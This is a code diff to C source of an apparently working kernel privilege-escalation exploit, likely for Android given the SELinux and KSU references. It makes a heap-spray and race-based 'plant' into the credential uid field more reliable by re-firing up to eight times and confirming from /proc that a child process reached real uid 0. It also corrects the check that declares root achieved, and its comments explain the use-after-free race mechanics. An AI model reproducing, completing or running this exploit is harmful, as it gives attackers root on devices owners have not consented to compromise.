@@ -978,6 +978,38 @@ static const char *getenforce_now(void)
     return buf[0] == '0' ? "Permissive" : buf[0] == '1' ? "Enforcing" : "?";
 }
 
+/* Real uid of a live (blocked) child, read back from /proc.  The burst-hit
+ * oracle only proves that our spray reclaimed the freed order-1 page; it does
+ * not prove that the rb_erase which carries the write happened afterwards.
+ * When the killer loses the race the exec thread erases the node normally,
+ * the reap still finds a clean tree, and the plant reports ok without a byte
+ * written -- so the shell path verifies the effect and re-fires. */
+static int proc_real_uid(pid_t pid, int *uid_out)
+{
+    char path[64], buf[1024];
+    char *p;
+    ssize_t n;
+    int fd;
+
+    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+        return -1;
+    n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    buf[n] = 0;
+    p = strstr(buf, "\nUid:");
+    if (!p)
+        return -1;
+    p += 5;
+    while (*p == '\t' || *p == ' ')
+        p++;
+    *uid_out = atoi(p);
+    return 0;
+}
+
 static int write_ksu_script(void)
 {
     static const char script[] =
@@ -2294,14 +2326,34 @@ int main(int argc, char **argv)
     if (!g_fake_stage)
     {
         struct plant_res r;
+        int verified = 0, held0 = g_held;
+
         memset(&r, 0, sizeof(r));
-        for (int a = 0; a < 3 && !r.ok; a++)
+        for (int a = 0; a < 8 && !verified; a++)
         {
-            logf("[+] plant attempt %d/3\n", a + 1);
+            int uid = -1;
+
+            logf("[+] plant attempt %d/8\n", a + 1);
+            memset(&r, 0, sizeof(r));
             run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
+            if (!r.ok)
+            {
+                /* The plant held a zombie: releasing it would walk the
+                 * corrupted timer tree, so stop instead of piling more on. */
+                if (g_held > held0)
+                    park_forever("plant held a zombie");
+                continue;
+            }
+            if (!proc_real_uid(C, &uid) && uid == 0)
+            {
+                logf("[+] plant verified: child real uid=0\n");
+                verified = 1;
+                break;
+            }
+            logf("[!] plant reaped cleanly but write missed (uid=%d)\n", uid);
         }
-        if (!r.ok)
-            park_forever("no successful plant");
+        if (!verified)
+            park_forever("no verified plant");
         if (g_child_task)
         {
             if (defeat_vr(g_child_task, raw))
@@ -2436,8 +2488,10 @@ int main(int argc, char **argv)
             logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                  rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                  rep.ruid, rep.reuid, rep.rsuid);
-            if (rep.uid == 0 && rep.euid == 0 && rep.setuid_ret == 0 &&
-                rep.reuid == 0)
+            /* rep.euid is the snapshot taken at wake, before setuid(0); the
+             * post-setuid effective uid is rep.reuid.  Requiring rep.euid==0
+             * made every successful shell run report failure. */
+            if (rep.uid == 0 && rep.setuid_ret == 0 && rep.reuid == 0)
                 g_root_ok = 1;
             else
                 logf("[!] child did not reach root "
